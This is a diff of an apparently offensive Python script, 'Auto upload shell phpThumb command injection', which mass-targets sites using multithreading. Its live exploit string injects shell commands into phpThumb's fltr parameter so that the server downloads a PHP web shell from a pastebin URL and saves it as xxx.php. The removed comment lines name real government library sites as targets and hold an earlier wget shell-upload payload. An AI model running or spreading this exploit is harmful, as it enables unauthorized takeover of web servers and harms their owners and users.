@@ -2,14 +2,7 @@ import requests, re, sys, base64
 from multiprocessing import Pool
 from multiprocessing.dummy import Pool as ThreadPool
 Thread_ = 20 #Thread
-
-#ex: http://digilib.batan.go.id/psta/libpsta//lib/watermark/phpThumb.php?src=file.jpg&fltr[]=blur|9%20-quality%2075%20-interlaceline%20file.jpg%20jpeg:file.jpg%20;ls%20-la;%20&phpThumbDebug=9
-#ex: http://perpustakaan.ptun-jakarta.go.id///lib/watermark/phpThumb.php?src=file.jpg&fltr[]=blur|9%20-quality%2075%20-interlaceline%20file.jpg%20jpeg:file.jpg%20;ls%20-la;%20&phpThumbDebug=9
-#exploit = '/lib/watermark/phpThumb.php?src=file.jpg&fltr[]=blur|9%20-quality%2075%20-interlaceline%20file.jpg%20jpeg:file.jpg%20;ls%20-la;%20&phpThumbDebug=9'
-#target = 'http://perpustakaan.ptun-jakarta.go.id/'
-#exploit= 'lib/watermark/phpThumb.php?src=file.jpg&fltr[]=blur|9%20-quality%2075%20-interlaceline%20file.jpg%20jpeg:file.jpg%20;wget site.com -O shell.php;%20&phpThumbDebug=9'
 exploit = 'lib/watermark/phpThumb.php?src=file.jpg&fltr[]=blur|9%20-quality%2075%20-interlaceline%20file.jpg%20jpeg:file.jpg%20;wget%20-O%20xxx.php%20https://pastebin.com/raw/JgDhgE0c;ls%20-la;cat%20xxx.php;%20&phpThumbDebug=9'
-#target = 'http://pustaka.pn-calang.go.id/'
 shell = '/lib/watermark/xxx.php'
 def zeerx7():
    print(base64.decodestring('w5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5cNCiBBdXRvIHVwbG9hZCBzaGVsbCBwaHBUaHVtYiBjb21tYW5kIGluamVjdGlvbg0KIENvZGVkIGJ5IFplZXJ4NyAtLS0tLS0tLS0tLS0tLS0gWHBsb2l0U2VjLUlEDQrDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDl8OXw5fDlw=='))
